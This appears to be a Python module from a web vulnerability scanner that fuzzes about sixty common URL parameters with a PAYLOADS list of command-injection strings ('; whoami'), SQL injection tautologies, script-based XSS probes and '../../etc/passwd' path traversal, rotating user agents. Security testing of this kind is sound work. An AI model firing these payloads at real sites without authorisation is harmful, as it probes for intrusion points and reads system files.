# from subdomains, archive urls and directory 

import httpx
from bs4 import BeautifulSoup
import difflib
import re
import logging
import random
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0)"
]

COMMON_PARAMS = [
    "id", "uid", "pid", "cid", "mid", "sid", "vid",
    "user", "userid", "username", "admin", "account", "login", "email",
    "q", "query", "search", "term", "keyword", "keywords", "s", "filter", "sort", "order", "orderby",
    "file", "path", "dir", "folder", "page", "doc", "document", "image", "download",
    "url", "redirect", "return", "next", "back", "continue", "goto", "dest", "callback",
    "token", "auth", "auth_token", "key", "apikey", "access", "session", "jwt",
    "debug", "test", "log", "mode", "preview", "env", "dev"
]

PAYLOADS = [
    {"payload": "; whoami", "expected_vulnerability": "CMDI"},
    {"payload": "&& ping -c 1 127.0.0.1", "expected_vulnerability": "CMDI"},

    {"payload": "' OR 1=1 --", "expected_vulnerability": "SQLI"},
    {"payload": "\" OR \"1\"=\"1", "expected_vulnerability": "SQLI"},

    {"payload": "\"><script>alert(1)</script>", "expected_vulnerability": "XSS"},
    {"payload": "<img src=x onerror=alert(1)>", "expected_vulnerability": "XSS"},
    {"payload": "<svg onload=alert(1)>", "expected_vulnerability": "XSS"},

    {"payload": "../../etc/passwd", "expected_vulnerability": "Path Traversal"},
    {"payload": "../../../../../../windows/win.ini", "expected_vulnerability": "Path Traversal"},
]

def inject_param(url: str, param: str, payload: str):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

def is_payload_reflected_unsafely(payload: str, response_html: str) -> bool:
    soup = BeautifulSoup(response_html, "html.parser")
    text = soup.get_text()
    return payload in text and payload in response_html  # Raw + visible reflection

async def analyze_response(client, base_url, param, payload_entry):
    payload = payload_entry["payload"]
    vuln_type = payload_entry["expected_vulnerability"]

    normal_url = inject_param(base_url, param, "test")
    test_url = inject_param(base_url, param, payload)

    headers = {
        "User-Agent": random.choice(USER_AGENTS)
    }

    try:
        normal_resp = await client.get(normal_url, headers=headers)
        test_resp = await client.get(test_url, headers=headers)

        soup = BeautifulSoup(test_resp.text, "html.parser")
        text_only = soup.get_text()

        reflected = is_payload_reflected_unsafely(payload, test_resp.text)
        error_signs = bool(re.search(r"(error|exception|traceback|syntax|sql|command)", test_resp.text, re.IGNORECASE))

        encoded_payload = re.sub(r"[^a-zA-Z0-9]", "", payload)
        encoded_found = encoded_payload in re.sub(r"[^a-zA-Z0-9]", "", test_resp.text)

        diff = list(difflib.unified_diff(
            normal_resp.text.splitlines(),
            test_resp.text.splitlines()
        ))
        diff_found = any(payload in line for line in diff)

        vuln_detected = False
        if vuln_type == "XSS" and reflected:
            vuln_detected = True
        elif vuln_type == "SQLI" and error_signs:
            vuln_detected = True
        elif vuln_type == "CMDI" and "uid=" in test_resp.text.lower():
            vuln_detected = True
        elif vuln_type == "Path Traversal" and ("root:x" in test_resp.text or "[extensions]" in test_resp.text):
            vuln_detected = True

        return {
            "url": test_url,
            "param": param,
            "payload": payload,
            "reflected": reflected,
            "encoded_match": encoded_found,
            "error_signs": error_signs,
            "diff_match": diff_found,
            "status_code": test_resp.status_code,
            "expected_vulnerability": vuln_type if vuln_detected else None
        }

    except Exception as e:
        return {"url": base_url, "param": param, "payload": payload, "error": str(e)}

def ensure_http_scheme(url: str) -> str:
    if not url.startswith("http://") and not url.startswith("https://"):
        return "http://" + url
    return url

async def scan_input_validation(base_url: str) -> list:
    base_url = ensure_http_scheme(base_url)
    results = []
    try:
        async with httpx.AsyncClient(follow_redirects=True, timeout=10.0) as client:
            tasks = []

            for param in COMMON_PARAMS:
                for payload_entry in PAYLOADS:
                    logger.info(f"Testing param '{param}' with payload for {payload_entry['expected_vulnerability']}")
                    tasks.append(analyze_response(client, base_url, param, payload_entry))

            semaphore = asyncio.Semaphore(10)

            async def sem_task(task):
                async with semaphore:
                    return await task

            raw_results = await asyncio.gather(*(sem_task(task) for task in tasks))

            for r in raw_results:
                results.append(r)

    except Exception as e:
        results.append({"error": f"Fatal error scanning base URL: {str(e)}"})

    return results